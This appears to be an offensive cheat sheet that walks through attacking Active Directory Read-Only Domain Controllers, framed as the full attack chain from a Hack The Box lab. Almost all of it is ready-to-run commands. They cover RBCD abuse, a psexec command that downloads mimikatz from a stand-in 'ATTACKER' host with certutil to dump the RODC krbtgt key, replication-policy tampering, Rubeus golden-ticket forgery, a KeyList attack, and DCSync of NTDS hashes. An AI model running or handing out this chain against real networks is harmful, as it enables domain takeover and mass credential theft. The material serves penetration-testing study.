title: rodc-attacks
html:
rodc-attacks

> Exploit Read-Only Domain Controllers for credential extraction and domain compromise. Full chain from Garfield HTB box.

What is an RODC?

- Read-Only Domain Controller — caches subset of AD passwords - Has its own krbtgt variant: krbtgt_XXXXX (e.g., krbtgt_8245) - msDS-RevealedUsers — accounts whose secrets are cached - msDS-RevealOnDemandGroup — accounts ALLOWED to be cached - msDS-NeverRevealGroup — accounts DENIED from caching - msDS-SecondaryKrbTgtNumber — the RODC number (e.g., 8245)

Enumeration

# Find RODC accounts
ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=67108864)' sAMAccountName
# Find RODC krbtgt
ldapsearch ... '(sAMAccountName=krbtgt_*)' sAMAccountName msDS-SecondaryKrbTgtNumber msDS-KeyVersionNumber
# Check revealed users
ldapsearch ... '(cn=RODC01)' msDS-RevealedUsers msDS-NeverRevealGroup msDS-RevealOnDemandGroup

Full Attack Chain (Garfield)

1. RBCD on RODC$ → Admin access

addcomputer.py 'domain/user:pass' -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP
rbcd.py 'domain/user:pass' -delegate-from 'FAKE01$' -delegate-to 'RODC01$' -action write -dc-ip DC_IP
getST.py 'domain/FAKE01$:FakePass123!' -spn cifs/RODC01.domain.htb -impersonate Administrator -dc-ip DC_IP

2. Pivot + psexec RODC → Extract krbtgt_XXXXX AES key

# Set up chisel SOCKS for internal pivot to RODC01
# Then psexec as Administrator:
proxychains psexec.py -k -no-pass -target-ip RODC_IP 'domain/Administrator@RODC01.domain.htb' \
  'cmd /c certutil -urlcache -split -f http://ATTACKER/mimi.exe C:\Windows\Temp\m.exe & C:\Windows\Temp\m.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" exit > C:\Windows\Temp\out.txt 2>&1'

3. Modify RODC replication policy (PowerView)

Import-Module .\powerview.ps1
Set-DomainObject -Identity RODC01$ -Set @{'msDS-RevealOnDemandGroup'=@(
  'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=htb',
  'CN=Administrator,CN=Users,DC=domain,DC=htb'
)}
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'

4. Forge RODC golden ticket

.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap \
  /aes256:EXTRACTED_AES_KEY /user:Administrator /id:500 /domain:domain.htb \
  /sid:S-1-5-21-XXXX

5. KeyList attack → real TGT

.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/domain.htb \
  /dc:<dc-hostname>.domain.htb /ticket:golden.kirbi /nowrap

6. DCSync

ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
nxc smb <dc-hostname>.domain.htb --use-kcache --ntds
